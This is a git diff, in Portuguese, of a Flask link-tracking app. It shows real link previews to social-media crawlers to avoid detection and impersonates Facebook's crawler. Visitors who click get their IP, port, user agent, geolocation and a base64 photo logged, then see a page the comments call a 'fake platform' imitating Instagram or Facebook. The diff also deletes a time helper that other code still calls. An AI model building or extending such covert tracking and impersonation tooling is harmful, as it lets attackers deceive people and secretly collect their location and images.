@@ -117,6 +117,7 @@ class IPInicial(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     slug = db.Column(db.String(255), db.ForeignKey('link.slug'))  # adicione isso
     ip = db.Column(db.String(50))
+    porta = db.Column(db.Integer())  
     data_hora = db.Column(db.DateTime, default=horario_brasilia)
     
 # Tabela de links
@@ -162,10 +163,9 @@ class Registro(db.Model):
     user_agent = db.Column(db.String(300))
     latitude = db.Column(db.String(50))
     longitude = db.Column(db.String(50))
-    porta = db.Column(db.String(10))  
+    porta = db.Column(db.Integer())  
     timestamp = db.Column(db.String(50))
     foto_base64 = db.Column(db.Text)
-    slug = db.Column(db.String(100))  # ✅ Esse campo precisa existir!
     slug = db.Column(db.String(100), db.ForeignKey('link.slug'))  # ✅ chave estrangeira
     link = db.relationship('Link', backref='registros')           # ✅ relação
 with app.app_context():
@@ -253,8 +253,8 @@ def rastrear_link(slug):
     bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
     is_bot = any(bot in user_agent for bot in bots)
 
-    # Se for um bot
     if is_bot:
+        # === PRÉVIA PARA BOTS ===
         if link.preview_titulo and link.preview_imagem:
             return render_template("preview_real.html",
                 titulo=link.preview_titulo,
@@ -275,9 +275,7 @@ def rastrear_link(slug):
             )
         else:
             try:
-                headers = {
-                    "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
-                }
+                headers = {"User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}
                 resposta = requests.get(link.destino, headers=headers, timeout=5)
                 soup = BeautifulSoup(resposta.text, "html.parser")
 
@@ -298,7 +296,7 @@ def rastrear_link(slug):
             except:
                 return render_template("preview_fallback.html", url_destino=link.destino)
 
-    # Se não for bot (visitante real)
+    # === VISITANTE REAL ===
     visitor_ip = request.remote_addr
     porta = request.environ.get('REMOTE_PORT') 
     timestamp = horario_brasilia()
@@ -313,12 +311,17 @@ def rastrear_link(slug):
     db.session.add(novo_registro)
     db.session.commit()
 
-    # Renderiza a plataforma falsa (Instagram, Facebook, etc.)
+    # Renderiza a plataforma falsa com botão de confirmação ou carregamento
     template_escolhido = f"{link.plataforma.lower()}.html"
     return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)
-def horario_brasilia():
-    # Oregon = UTC-7 | Brasília = UTC-3 => diferença = +4 horas
-    return (datetime.now() + timedelta(hours=4)).strftime("%d/%m/%Y %H:%M:%S")
+@app.route("/redir/<slug>")
+def redirecionar(slug):
+    link = Link.query.filter_by(slug=slug).first_or_404()
+    destino = link.destino
+
+    # (Opcional) você pode gravar aqui que o redirecionamento foi concluído
+    return render_template("redirect.html", destino=destino)
+
 
 # Página inicial
 @app.route("/todos_links")
@@ -432,8 +435,9 @@ def coletar_ip_inicial():
     dados = request.get_json()
     slug = dados.get("slug")
     ip = dados.get("ip")
+    porta = request.environ.get('REMOTE_PORT')
 
-    novo_ip = IPInicial(slug=slug, ip=ip)
+    novo_ip = IPInicial(slug=slug, ip=ip, porta=porta)
     db.session.add(novo_ip)
     db.session.commit()
 
